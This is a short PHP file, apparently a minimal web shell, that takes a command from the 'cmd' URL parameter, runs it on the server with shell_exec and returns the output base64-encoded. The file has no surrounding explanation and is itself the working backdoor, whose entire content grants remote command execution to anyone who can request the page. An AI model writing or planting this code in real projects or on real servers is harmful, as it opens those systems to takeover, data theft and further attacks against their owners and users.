<?php
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd'] . " 2>&1");
    echo base64_encode($output);
}
?>
